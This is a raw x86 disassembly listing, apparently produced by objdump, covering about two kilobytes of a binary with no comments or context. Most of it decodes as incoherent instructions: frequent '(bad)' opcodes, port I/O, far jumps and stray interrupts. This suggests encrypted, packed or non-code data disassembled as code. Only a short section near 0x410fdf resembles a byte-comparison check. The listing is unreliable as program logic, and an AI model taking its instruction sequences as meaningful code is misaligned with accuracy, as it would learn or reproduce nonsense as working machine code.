  410afa:	in     eax,dx
  410afb:	sub    eax,edx
  410afd:	jl     0x410b68
  410aff:	adc    dl,BYTE PTR [ebp+0x53]
  410b02:	ja     0x410b83
  410b04:	mov    ebx,0x3510e01c
  410b09:	xchg   edx,eax
  410b0a:	inc    esi
  410b0b:	loop   0x410b27
  410b0d:	pop    ecx
  410b0e:	dec    ebx
  410b0f:	or     edi,DWORD PTR [ecx+0x7c5c04f3]
  410b15:	mov    dh,0xbd
  410b17:	pop    ds
  410b18:	adc    eax,0x7aa7263a
  410b1d:	cmp    DWORD PTR [edi+ebx*4-0x17a8e878],edi
  410b24:	das    
  410b25:	imul   esi,DWORD PTR [esp+ebx*1-0x6e],0x74
  410b2a:	addr16 inc eax
  410b2c:	popa   
  410b2d:	mov    dh,0xd
  410b2f:	xor    al,0x4
  410b31:	cmp    ah,ah
  410b33:	jmp    0x410ac9
  410b35:	mov    bl,0xef
  410b37:	outs   dx,BYTE PTR ds:[esi]
  410b38:	shl    DWORD PTR [esi+0x6b],cl
  410b3b:	sar    BYTE PTR [edx-0x5d94d538],1
  410b41:	and    eax,0xc2335d2e
  410b46:	scas   al,BYTE PTR es:[edi]
  410b47:	xor    dl,al
  410b49:	aam    0x5c
  410b4b:	and    eax,0xc202489b
  410b50:	xor    ecx,DWORD PTR ds:0xede7c1c2
  410b56:	aam    0xe8
  410b58:	(bad)  
  410b59:	pop    ecx
  410b5a:	xchg   esp,eax
  410b5b:	push   esi
  410b5c:	push   edx
  410b5d:	or     eax,0xe078527e
  410b62:	out    0xe7,al
  410b64:	mov    al,0xf0
  410b66:	jl     0x410b80
  410b68:	mov    BYTE PTR [eax+0x3874ca06],dh
  410b6e:	mov    BYTE PTR [ebp*8-0x29e2b408],dl
  410b75:	stos   BYTE PTR es:[edi],al
  410b76:	(bad)  
  410b77:	(bad)  
  410b78:	sbb    eax,0xe29aa7aa
  410b7d:	jmp    0x3894:0xdb17e02d
  410b84:	or     al,0x4c
  410b86:	pushf  
  410b87:	sbb    DWORD PTR [ebx-0xab385a8],ecx
  410b8d:	sbb    eax,0xf292d384
  410b92:	cmp    cl,BYTE PTR [ecx+0x34]
  410b95:	popa   
  410b96:	xor    al,0x1b
  410b98:	clc    
  410b99:	js     0x410c05
  410b9b:	gs dec esi
  410b9d:	rol    WORD PTR [ebp-0x3e],cl
  410ba1:	cmp    ebp,edx
  410ba3:	adc    al,0xc9
  410ba5:	sub    al,0x51
  410ba7:	inc    ecx
  410ba8:	test   al,0x68
  410baa:	pusha  
  410bab:	mov    ebp,0x5706bb5
  410bb0:	push   esi
  410bb1:	les    esp,FWORD PTR ds:0xc32e0ea6
  410bb7:	fld    QWORD PTR ds:[edx]
  410bba:	sub    eax,0x75b394c7
  410bbf:	mov    BYTE PTR [esi+0x56076841],bh
  410bc5:	adc    bl,BYTE PTR [eax+0xa0c99a0]
  410bcb:	inc    edi
  410bcc:	jp     0x410bc0
  410bce:	push   ebp
  410bcf:	lock jmp 0xd21117ef
  410bd5:	(bad)  
  410bd7:	dec    ebx
  410bd8:	gs stc 
  410bda:	push   ss
  410bdb:	data16 jecxz 0x410bf2
  410bde:	pushf  
  410bdf:	dec    edi
  410be0:	sahf   
  410be1:	xchg   ebp,eax
  410be2:	loopne 0x410c3d
  410be4:	out    dx,eax
  410be5:	in     eax,dx
  410be6:	pop    ecx
  410be7:	and    al,0xb7
  410be9:	aaa    
  410bea:	rcr    BYTE PTR [edx],0xcf
  410bed:	outs   dx,DWORD PTR ds:[esi]
  410bee:	stos   DWORD PTR es:[edi],eax
  410bef:	mov    dl,0x86
  410bf1:	sbb    esi,DWORD PTR [ecx+eax*8-0x3b0855fb]
  410bf8:	das    
  410bf9:	sbb    BYTE PTR [ecx+0x5b],0xc2
  410bfd:	stc    
  410bfe:	fdiv   QWORD PTR [eax-0x19537337]
  410c04:	jg     0x410bcb
  410c06:	call   0x57e4:0x90ede991
  410c0d:	xor    BYTE PTR [ebx+ebx*2],cl
  410c10:	xchg   DWORD PTR [edi+eax*8+0x5841b3e3],ecx
  410c17:	ss pop eax
  410c19:	mov    esi,0x18aad30a
  410c1e:	or     eax,0x627bc5d2
  410c23:	jns    0x410be9
  410c25:	jbe    0x410c52
  410c27:	inc    esi
  410c28:	gs dec edi
  410c2a:	fbld   TBYTE PTR ds:0x381db38e
  410c31:	in     eax,dx
  410c32:	ret    0xe13c
  410c35:	fucomip st,st(2)
  410c37:	add    al,0x87
  410c39:	sbb    eax,0x9c67ed58
  410c3e:	xor    DWORD PTR [ecx*2+0x7f3bbc69],ebx
  410c45:	jp     0x410cb9
  410c47:	xchg   BYTE PTR [ebp+0x2e85b47b],ch
  410c4d:	pop    es
  410c4e:	add    esi,DWORD PTR [ecx-0x5238bfdd]
  410c54:	sub    esp,esp
  410c56:	daa    
  410c57:	retf   
  410c58:	xchg   edx,eax
  410c59:	test   eax,0x8653529d
  410c5e:	in     al,dx
  410c5f:	xchg   BYTE PTR [eax-0x3bacf9e4],cl
  410c65:	shl    DWORD PTR [ebx],0x8e
  410c68:	cmp    ecx,DWORD PTR [ebx+eax*1]
  410c6b:	aad    0x32
  410c6d:	out    0x38,al
  410c6f:	jmp    0x410ca9
  410c71:	push   esp
  410c72:	sbb    ebx,DWORD PTR [edi]
  410c74:	xor    al,0x62
  410c76:	retf   0x88ec
  410c79:	mov    eax,ds:0xd48c609
  410c7e:	mov    ch,0x28
  410c80:	xchg   ecx,eax
  410c81:	scas   al,BYTE PTR es:[edi]
  410c82:	rcr    BYTE PTR [edi+edi*8],cl
  410c85:	push   esi
  410c86:	add    eax,0xa3656dba
  410c8b:	loopne 0x410c26
  410c8d:	cwde   
  410c8e:	jb     0x410cc1
  410c90:	hlt    
  410c91:	mov    dl,0x28
  410c93:	cwde   
  410c94:	enter  0x1b66,0x33
  410c98:	sbb    BYTE PTR [esi+0x5791c5a6],al
  410c9e:	xor    bh,BYTE PTR [esi]
  410ca0:	imul   esi,DWORD PTR [edx],0xfd6c57ae
  410ca6:	cmp    BYTE PTR [ecx+0x7347de7d],bl
  410cac:	sar    BYTE PTR [ebp-0x2e],1
  410caf:	jae    0x410c93
  410cb1:	cmp    BYTE PTR [ebx+0xa983f42],cl
  410cb7:	inc    ebp
  410cb8:	pop    ebp
  410cb9:	jge    0x410ca9
  410cbb:	(bad)  
  410cbc:	jb     0x410c88
  410cbe:	loop   0x410d26
  410cc0:	mov    al,0xe5
  410cc2:	fsubr  DWORD PTR [ebp+0x42]
  410cc5:	fist   DWORD PTR [ebx-0x68ff2ae8]
  410ccb:	mov    edi,0x19854feb
  410cd0:	push   esp
  410cd1:	jne    0x410d25
  410cd3:	int    0x23
  410cd5:	pop    esp
  410cd6:	cmp    esi,DWORD PTR [edi-0x6c]
  410cd9:	lahf   
  410cda:	pushw  ds
  410cdc:	fild   QWORD PTR [ebp+0x45]
  410cdf:	add    cl,BYTE PTR [esi-0x7eca2bfc]
  410ce5:	das    
  410ce6:	dec    ebx
  410ce7:	fild   QWORD PTR [ebx-0x251e7d93]
  410ced:	rol    DWORD PTR [ebx+0x30],0x69
  410cf1:	dec    ebx
  410cf2:	leave  
  410cf3:	aad    0x87
  410cf5:	adc    DWORD PTR [esi+0x14],esi
  410cf8:	push   es
  410cf9:	jae    0x410d05
  410cfb:	jecxz  0x410d58
  410cfd:	dec    ebx
  410cfe:	adc    eax,0x7fb8f107
  410d03:	leave  
  410d04:	mov    edi,0xbe22b75a
  410d09:	mov    ds:0x28957f6,eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xaa62bf9c
  410d25:	push   ecx
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d49
  410d2f:	jmp    0xd15dafd2
  410d34:	sbb    ebp,DWORD PTR [eax+0x23bade94]
  410d3a:	shl    DWORD PTR [esi+eiz*2-0x42],1
  410d3e:	dec    ebp
  410d3f:	pop    ss
  410d40:	outs   dx,DWORD PTR cs:[esi]
  410d42:	loopne 0x410d50
  410d44:	scas   al,BYTE PTR es:[edi]
  410d45:	xchg   edx,eax
  410d46:	mov    ch,0xfe
  410d48:	or     ebx,DWORD PTR [eax-0x67]
  410d4b:	jl     0x410d49
  410d4d:	enter  0x3a76,0x83
  410d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d52:	icebp  
  410d53:	cs int 0x60
  410d56:	(bad)  
  410d57:	mov    bh,0x1e
  410d59:	mov    ds:0x6fba6a6d,eax
  410d5e:	sahf   
  410d5f:	jbe    0x410d12
  410d61:	add    esp,esp
  410d63:	or     bh,0x1c
  410d66:	mov    al,ds:0x1430a3b2
  410d6b:	(bad)  [esi+eiz*4]
  410d6e:	jmp    0x410d56
  410d70:	push   ss
  410d71:	arpl   WORD PTR [eax],cx
  410d73:	lds    ebp,FWORD PTR [eax]
  410d75:	shl    BYTE PTR [esi-0x33],0x70
  410d79:	mov    dl,0xa5
  410d7b:	sbb    bh,BYTE PTR [ebp-0x30]
  410d7e:	push   esi
  410d7f:	xor    eax,0xaa586a08
  410d84:	adc    bl,BYTE PTR [ebx+edx*1+0x7eddc565]
  410d8b:	dec    esp
  410d8c:	dec    esp
  410d8d:	std    
  410d8e:	pop    eax
  410d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d90:	mov    al,0x8e
  410d92:	scas   al,BYTE PTR es:[edi]
  410d93:	add    eax,0x1e315bb9
  410d98:	lock cs (bad) 
  410d9b:	gs adc ch,al
  410d9e:	mov    dh,0xb3
  410da0:	dec    ebx
  410da1:	test   al,0xde
  410da3:	ja     0x410dc8
  410da5:	mov    al,0xe5
  410da7:	adc    BYTE PTR [edi+0x14],al
  410daa:	sbb    al,0x90
  410dac:	sub    al,0x30
  410dae:	test   DWORD PTR [esi-0x34],edi
  410db1:	mov    esi,0xa8d453c2
  410db6:	popa   
  410db7:	sub    DWORD PTR [ebx],ebx
  410db9:	sub    esi,DWORD PTR [ebx-0x14bb701f]
  410dbf:	or     BYTE PTR [bp+di],al
  410dc2:	imul   eax,DWORD PTR [ebp-0xff90fb6],0xffffffb9
  410dc9:	jno    0x410dba
  410dcb:	(bad)  
  410dcc:	add    BYTE PTR [ecx+edx*1],al
  410dcf:	mov    ch,BYTE PTR [ebx-0x4a]
  410dd2:	push   ss
  410dd3:	adc    eax,0x7a080773
  410dd8:	push   es
  410dd9:	inc    ecx
  410dda:	cmp    edx,DWORD PTR [esi-0x31]
  410ddd:	mov    ds:0x8142a009,al
  410de2:	push   cs
  410de3:	cli    
  410de4:	adc    eax,0x8a55f8c9
  410de9:	loop   0x410d76
  410deb:	cmp    eax,0x79872081
  410df0:	repnz mov dl,ch
  410df3:	cmp    DWORD PTR [edi+ecx*8+0x60af8048],eax
  410dfa:	or     cl,BYTE PTR [ebx+edx*1-0x5d8617ec]
  410e01:	xor    edi,edx
  410e03:	test   eax,0xf493cfc8
  410e08:	cmp    al,0x89
  410e0a:	xchg   DWORD PTR [esi+0x7e317c6d],ebp
  410e10:	mov    esp,0x772fb2f5
  410e15:	push   es
  410e16:	imul   edi,DWORD PTR [ecx],0xb7b9fb71
  410e1c:	dec    esp
  410e1d:	jnp    0x410e28
  410e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e20:	ja     0x410e74
  410e22:	push   ss
  410e23:	pop    ds
  410e24:	imul   ecx,ebx,0xffffff82
  410e27:	or     al,0x77
  410e29:	mov    ebp,0x839d92ec
  410e2e:	test   DWORD PTR [ecx+edx*2+0x3b],eax
  410e32:	loope  0x410df2
  410e34:	push   esi
  410e35:	sub    DWORD PTR [eax-0x47],0xffffffbf
  410e39:	mov    al,ch
  410e3b:	in     al,dx
  410e3c:	stc    
  410e3d:	test   ch,bl
  410e3f:	(bad)  
  410e40:	xchg   ebx,eax
  410e41:	jno    0x410e71
  410e43:	push   cs
  410e44:	xor    esp,DWORD PTR [esi]
  410e46:	or     ebx,DWORD PTR [edi-0x2da709c1]
  410e4c:	int    0x2b
  410e4e:	mov    al,0x29
  410e50:	int    0xef
  410e52:	fcomip st,st(6)
  410e54:	hlt    
  410e55:	sbb    eax,0x20d0c130
  410e5a:	jbe    0x410e42
  410e5c:	je     0x410e8a
  410e5e:	scas   eax,DWORD PTR es:[edi]
  410e5f:	je     0x410e44
  410e61:	lock aad 0x1f
  410e64:	push   0x7d
  410e66:	ret    0x8c1f
  410e69:	mov    ?,esi
  410e6b:	jb     0x410ea9
  410e6d:	in     eax,dx
  410e6e:	hlt    
  410e6f:	xor    eax,0x88f5523a
  410e74:	pop    edx
  410e75:	mov    edi,DWORD PTR [ebx-0x4dca05ca]
  410e7b:	adc    esi,DWORD PTR [ecx-0x14]
  410e7e:	jmp    FWORD PTR ds:0xb14e1e02
  410e84:	(bad)  
  410e85:	(bad)  
  410e86:	out    dx,al
  410e87:	pop    edx
  410e88:	lea    ebx,[edi]
  410e8a:	adc    eax,0xe9d1fe09
  410e8f:	in     al,dx
  410e90:	jl     0x410e37
  410e92:	(bad)  
  410e93:	mov    cl,0x2f
  410e95:	add    bl,BYTE PTR [edx-0x65ca72fe]
  410e9b:	popf   
  410e9c:	dec    edx
  410e9d:	pop    edx
  410e9e:	mov    ah,0xeb
  410ea0:	add    edi,esi
  410ea2:	push   ds
  410ea3:	ret    0x189d
  410ea6:	ins    BYTE PTR es:[edi],dx
  410ea7:	cs add edx,ebx
  410eaa:	mov    esi,0x558598c0
  410eaf:	pop    esp
  410eb0:	addr16 push edi
  410eb2:	inc    edi
  410eb3:	lods   al,BYTE PTR ds:[esi]
  410eb4:	ins    DWORD PTR es:[edi],dx
  410eb5:	push   eax
  410eb6:	push   esi
  410eb7:	ret    0x8648
  410eba:	jmp    0x58011ac6
  410ebf:	sub    DWORD PTR [ecx],0xc94d14eb
  410ec5:	jmp    0x50dd:0xe970bd3d
  410ecc:	lahf   
  410ecd:	or     DWORD PTR [edi+0x2a],0x4e
  410ed1:	fwait
  410ed2:	jle    0x410e88
  410ed4:	addr16 sub al,0xfa
  410ed7:	inc    esp
  410ed8:	inc    ecx
  410ed9:	inc    esp
  410eda:	dec    DWORD PTR [esi-0x3df9f79]
  410ee0:	call   0x69336af7
  410ee5:	sub    ah,BYTE PTR [ebx-0x3c]
  410ee8:	fldenv [ebx+0xbc397b0]
  410eee:	ds push ebx
  410ef0:	sbb    al,BYTE PTR ds:0xe944c2ec
  410ef6:	adc    esi,ebx
  410ef8:	arpl   WORD PTR [ebx+0x754294ae],bx
  410efe:	cmp    BYTE PTR [esi],bl
  410f00:	sahf   
  410f01:	pushf  
  410f02:	dec    ebp
  410f03:	out    dx,eax
  410f04:	pop    ds
  410f05:	jnp    0x410ed5
  410f07:	mov    BYTE PTR [edi-0x26],bh
  410f0a:	jo     0x410f13
  410f0c:	fisttp DWORD PTR [ebx+0x3c6a7f78]
  410f12:	cmc    
  410f13:	retf   
  410f14:	sbb    edi,DWORD PTR [esi]
  410f16:	js     0x410f0b
  410f18:	cmp    eax,DWORD PTR [eax]
  410f1a:	fstp   QWORD PTR ds:0x1a7d8ee4
  410f20:	jecxz  0x410f12
  410f22:	(bad)  
  410f23:	push   ebx
  410f24:	xchg   cl,ah
  410f26:	loope  0x410ec0
  410f28:	sub    BYTE PTR [ecx-0x2c4f7cc6],ah
  410f2e:	shr    BYTE PTR [esi+eax*4+0x5b],cl
  410f32:	pusha  
  410f33:	leave  
  410f34:	jp     0x410f7f
  410f36:	sub    DWORD PTR [edx-0x77],esi
  410f39:	xchg   esp,eax
  410f3a:	mov    ds:0xb321a97f,eax
  410f3f:	pop    ecx
  410f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f41:	orps   xmm4,xmm4
  410f44:	cmp    eax,DWORD PTR [ecx-0x51]
  410f47:	cmp    eax,0x4e38fb68
  410f4c:	mov    cl,0xc8
  410f4e:	or     eax,0x336f0635
  410f53:	aaa    
  410f54:	sub    BYTE PTR [ecx],ch
  410f56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f57:	das    
  410f58:	mov    ds:0x8f35f2,eax
  410f5d:	pop    ebp
  410f5e:	inc    ebx
  410f5f:	aas    
  410f60:	xchg   esp,eax
  410f61:	dec    eax
  410f62:	and    BYTE PTR [eax],bl
  410f64:	pop    edi
  410f65:	push   ds
  410f66:	dec    edx
  410f67:	out    dx,eax
  410f68:	sar    BYTE PTR [ecx-0x76],1
  410f6b:	pop    esi
  410f6c:	add    BYTE PTR [ebx+0x1f4a6089],bl
  410f72:	sub    eax,0x5bc174e2
  410f77:	mov    DWORD PTR [esi+0x47],ebx
  410f7a:	in     al,dx
  410f7b:	xchg   edi,eax
  410f7c:	jb     0x410f0e
  410f7e:	sbb    DWORD PTR [edi+0x4e1454ce],esi
  410f84:	mov    ds:0x566462d1,eax
  410f89:	lods   eax,DWORD PTR ds:[esi]
  410f8a:	mov    eax,0xf4361812
  410f8f:	test   edi,0x92fe272
  410f95:	in     al,0x3b
  410f97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f98:	push   0xffffffe6
  410f9a:	(bad)  
  410f9b:	and    cl,bl
  410f9d:	dec    ecx
  410f9e:	inc    edx
  410f9f:	mov    esp,0x7e28774d
  410fa4:	xor    ch,BYTE PTR [edi+edi*1-0x508db00b]
  410fab:	daa    
  410fac:	mov    dl,0xe7
  410fae:	pop    esi
  410faf:	xchg   ebp,eax
  410fb0:	pop    esi
  410fb1:	mov    esi,0xfa22f6b9
  410fb6:	in     eax,dx
  410fb7:	out    dx,eax
  410fb8:	int    0x5b
  410fba:	and    al,0x79
  410fbc:	jmp    0xf96dc234
  410fc1:	cdq    
  410fc2:	xlat   BYTE PTR ds:[ebx]
  410fc3:	shr    DWORD PTR [edx+0x62a1b7f4],1
  410fc9:	mov    esp,0x12181592
  410fce:	addr16 int 0xa6
  410fd1:	mov    cl,BYTE PTR [eax+0x55c6ac09]
  410fd7:	or     dl,ch
  410fd9:	into   
  410fda:	mov    ebx,0x676c7d4c
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fb4
  41102b:	inc    BYTE PTR [esi]
  41102d:	inc    eax
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x4110b2
  411037:	pop    ebp
  411038:	cwde   
  411039:	std    
  41103a:	adc    eax,0xeb1c156c
  41103f:	jne    0x41109d
  411041:	xor    esi,DWORD PTR [eax+0x5b33a9e5]
  411047:	sub    cl,bh
  411049:	dec    esp
  41104a:	or     DWORD PTR [edx+eax*1],0x8d4a4385
  411051:	jnp    0x4110c7
  411053:	les    esi,FWORD PTR [eax]
  411055:	jmp    0xa81684fa
  41105a:	fdivp  st(1),st
  41105c:	sbb    eax,0x8107bb6
  411061:	cmc    
  411062:	or     eax,0xc0eba95d
  411067:	cmp    bh,BYTE PTR [ecx-0x3ad95c6d]
  41106d:	jle    0x411016
  41106f:	jns    0x411027
  411071:	mov    bl,0xd9
  411073:	sub    ebp,DWORD PTR ds:0xad7d6336
  411079:	mov    dl,0x1c
  41107b:	jle    0x41109e
  41107d:	add    esp,DWORD PTR [ebx]
  41107f:	leave  
  411080:	dec    esi
  411081:	cmp    eax,0x9dc740d3
  411086:	lahf   
  411087:	push   edx
  411088:	call   0x531914cf
  41108d:	dec    esp
  41108e:	jp     0x411020
  411090:	fstp   DWORD PTR [esi-0x4ea28347]
  411096:	and    esi,DWORD PTR [edi]
  411098:	xchg   esp,eax
  411099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41109a:	std    
  41109b:	pop    ss
  41109c:	inc    ecx
  41109d:	xchg   ecx,eax
  41109e:	bound  esi,QWORD PTR [eax+0x234e2bb3]
  4110a4:	int    0xd0
  4110a6:	cld    
  4110a7:	jp     0x4110a4
  4110a9:	pop    ebx
  4110aa:	stc    
  4110ab:	jl     0x41103f
  4110ad:	xor    al,0xa
  4110af:	xlat   BYTE PTR ds:[ebx]
  4110b0:	rcr    DWORD PTR [esp+ebp*4+0x18],0x65
  4110b5:	adc    esp,DWORD PTR [edx]
  4110b7:	lods   eax,DWORD PTR ds:[esi]
  4110b8:	jo     0x41103e
  4110ba:	push   esi
  4110bb:	lods   al,BYTE PTR ds:[esi]
  4110bc:	shl    DWORD PTR [eax],1
  4110be:	sub    BYTE PTR [ecx+0x64f8cf6c],ch
  4110c4:	sbb    al,0x3b
  4110c6:	in     al,0x0
  4110c8:	inc    esi
  4110c9:	xor    ebx,DWORD PTR [eax+0x49]
  4110cc:	ins    BYTE PTR es:[edi],dx
  4110cd:	xor    dh,cl
  4110cf:	aas    
  4110d0:	int    0xee
  4110d2:	into   
  4110d3:	cli    
  4110d4:	in     eax,0x77
  4110d6:	add    dl,BYTE PTR [ebx+0x3134112a]
  4110dc:	enter  0xc927,0x90
  4110e0:	popf   
  4110e1:	jns    0x4110f5
  4110e3:	push   es
  4110e4:	pop    eax
  4110e5:	es push ebp
  4110e7:	les    esp,FWORD PTR [ebp+0x7589fd67]
  4110ed:	xor    esi,DWORD PTR [edx-0x15]
  4110f0:	push   esp
  4110f1:	jo     0x41115c
  4110f3:	repnz loop 0x41114f
  4110f6:	adc    eax,0x3dfe1136
  4110fb:	xor    edi,eax
  4110fd:	pop    esi
  4110fe:	push   esi
  4110ff:	(bad)  
  411100:	xor    eax,0x97089522
  411105:	inc    edx
  411106:	stos   DWORD PTR es:[edi],eax
  411107:	jno    0x41108a
  411109:	out    dx,eax
  41110a:	or     BYTE PTR [esi],dl
  41110c:	jnp    0x4110e0
  41110e:	imul   BYTE PTR [ebx]
  411110:	add    ebx,ebx
  411112:	scas   eax,DWORD PTR es:[edi]
  411113:	adc    BYTE PTR [esi+0x43b4e2dd],ah
  411119:	ins    DWORD PTR es:[edi],dx
  41111a:	lds    esp,FWORD PTR ds:0x2c5f8c4b
  411120:	sahf   
  411121:	test   DWORD PTR [edx-0xf],eax
  411124:	call   0x7bd6a64f
  411129:	fs loope 0x41117f
  41112c:	repnz mov bh,0x2
  41112f:	pushf  
  411130:	popa   
  411131:	cli    
  411132:	sub    eax,0x29f34502
  411137:	inc    edi
  411138:	jecxz  0x411148
  41113a:	xlat   BYTE PTR ds:[ebx]
  41113b:	rcr    BYTE PTR [bx+di],1
  41113e:	imul   ecx,DWORD PTR [ebx-0x7a],0xff775c2e
  411145:	push   esp
  411146:	xor    esi,ebx
  411148:	push   esi
  411149:	in     al,dx
  41114a:	in     al,0x5a
  41114c:	call   0x2e8abb96
  411151:	sar    DWORD PTR [edx+eiz*4],cl
  411154:	in     al,0xdf
  411156:	sub    ecx,ecx
  411158:	xor    DWORD PTR [edi],esp
  41115a:	mov    DWORD PTR [esi+0x46],eax
  41115d:	sub    cl,bh
  41115f:	or     DWORD PTR [ebp+0x7e],0xa176bfaa
  411166:	xchg   edx,eax
  411167:	sub    BYTE PTR [ecx-0x716b81e0],0x95
  41116e:	aas    
  41116f:	and    BYTE PTR [edx+0x4117bc3],cl
  411175:	pop    eax
  411176:	inc    esi
  411177:	iret   
  411178:	mov    bh,0x1b
  41117a:	pop    ecx
  41117b:	arpl   WORD PTR [eax+eax*2-0x51],di
  41117f:	mov    al,0xef
  411181:	jb     0x4111f6
  411183:	mov    esi,0xc1a21ce4
  411188:	outs   dx,BYTE PTR ds:[esi]
  411189:	(bad)  
  41118a:	aad    0x53
  41118c:	bound  esp,QWORD PTR [esi+0x7521574f]
  411192:	call   0x2145:0x26dd42be
  411199:	cmp    edi,DWORD PTR [edi-0x39a9dbe6]
  41119f:	out    0x6a,eax
  4111a1:	push   0xc28855a6
  4111a6:	cmp    eax,0xe1f092c6
  4111ab:	dec    ecx
  4111ac:	jecxz  0x411139
  4111ae:	mov    ebx,0xb24cbdd7
  4111b3:	rcl    ah,1
  4111b5:	(bad)
  4111b8:	clc    
  4111b9:	adc    al,dl
  4111bb:	(bad)  
  4111bc:	and    bl,BYTE PTR ds:0x8fbe72d3
  4111c2:	in     al,0xb7
  4111c4:	ins    DWORD PTR es:[edi],dx
  4111c5:	je     0x41114e
  4111c7:	rol    DWORD PTR [edx+0x687e13f7],1
  4111cd:	aas    
  4111ce:	mov    ebp,cs
  4111d0:	cmp    BYTE PTR [ebx+0x55],0x7b
  4111d4:	mov    eax,0x7f07cd78
  4111d9:	sub    DWORD PTR [edi+0x51],eax
  4111dc:	enter  0x8186,0x7b
  4111e0:	adc    ebp,DWORD PTR ds:0x8c7d0cfa
  4111e6:	mov    cl,0x4d
  4111e8:	jmp    0x5e24:0x388aab8d
  4111ef:	mov    al,0x96
  4111f1:	and    DWORD PTR ds:0x8cc020ed,ecx
  4111f7:	(bad)  
  4111f8:	arpl   si,di
  4111fa:	sahf   
  4111fb:	lea    eax,[esi+0x5e]
  4111fe:	pop    ds
  4111ff:	jmp    0x7ecf42e5
  411204:	jne    0x4111ef
  411206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411207:	das    
  411208:	cmc    
  411209:	xchg   edi,eax
  41120a:	repz jmp 0x332:0x7c7f29bd
  411212:	les    eax,FWORD PTR [eax+0x306b66e2]
  411218:	faddp  st(6),st
  41121a:	(bad)  
  41121b:	stos   DWORD PTR es:[edi],eax
  41121c:	add    bh,bh
  41121e:	jnp    0x4111f0
  411220:	(bad)  
  411222:	add    esp,DWORD PTR [edi*4+0x5c16a01f]
  411229:	dec    esi
  41122a:	(bad)  
  41122b:	stos   BYTE PTR es:[edi],al
  41122c:	jecxz  0x411246
  41122e:	stos   DWORD PTR es:[edi],eax
  41122f:	test   DWORD PTR ds:0xeb78e498,esi
  411235:	jno    0x41124e
  411237:	xchg   ebx,eax
  411238:	lods   eax,DWORD PTR ds:[esi]
  411239:	push   ebx
  41123a:	iret   
  41123b:	mov    ecx,0x642c2206
  411240:	lea    esi,[edx+0xa84ba2e]
  411246:	mov    DWORD PTR [ecx],esi
  411248:	div    DWORD PTR [esi-0x3a842517]
  41124e:	pop    edi
  41124f:	sar    BYTE PTR [ecx+0x29],cl
  411252:	push   esp
  411253:	cmc    
  411254:	retf   
  411255:	cmp    ah,bh
  411257:	pusha  
  411258:	xor    cl,BYTE PTR [ecx]
  41125a:	out    dx,al
  41125b:	mov    bh,0xbb
  41125d:	xchg   esi,eax
  41125e:	fst    QWORD PTR [esi+0x31]
  411261:	cmp    ebp,DWORD PTR [esi-0x32]
  411264:	push   edx
  411265:	std    
  411266:	mov    edx,ecx
  411268:	out    0xea,al
  41126a:	and    esi,edx
  41126c:	mov    esp,0xfd6af2b1
  411271:	xchg   dh,bh
  411273:	aam    0xff
  411275:	pop    ss
  411276:	sub    eax,0xbb5a3efe
  41127b:	out    0xcf,eax
  41127d:	dec    eax
  41127e:	pop    ds
  41127f:	scas   eax,DWORD PTR es:[edi]
  411280:	in     eax,dx
  411281:	and    BYTE PTR [edi+0x75],cl
  411284:	mov    dh,0x90
  411286:	mov    bh,0xe8
  411288:	adc    al,0x1d
  41128a:	xor    ch,BYTE PTR [edx-0x4f]
  41128d:	inc    esp
  41128e:	shl    bh,cl
  411290:	mov    eax,0xb8e95005
  411295:	(bad)  
  411296:	daa    
  411297:	add    eax,DWORD PTR [ebx-0x75]
  41129a:	add    al,0x79
  41129c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41129d:	xchg   BYTE PTR ds:[ecx-0x38],ah
  4112a1:	or     al,0x3d
  4112a3:	dec    edx
  4112a4:	cmp    DWORD PTR [edi+0x549e4692],0x74ffe63a
  4112ae:	out    dx,al
  4112af:	cdq    
  4112b0:	imul   esi,DWORD PTR [edx+ebx*8],0x67947128
  4112b7:	out    dx,eax
  4112b8:	pop    ds
  4112b9:	cmp    ebx,DWORD PTR [edx-0x2da6204d]
  4112bf:	aaa    
  4112c0:	mov    edx,0x2cff43c8
  4112c5:	out    0x6,eax
  4112c7:	pop    edi
  4112c8:	pop    esp
  4112c9:	jns    0x4112c4
  4112cb:	sti    
  4112cc:	dec    esp
  4112cd:	pop    ds
  4112ce:	xor    dh,ah
  4112d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d1:	jmp    0x41130a
  4112d3:	cli    
  4112d4:	mov    esi,0xabe36a69
  4112d9:	jl     0x411275
  4112db:	mov    esi,DWORD PTR [eax+0x6062beb5]
  4112e1:	(bad)  
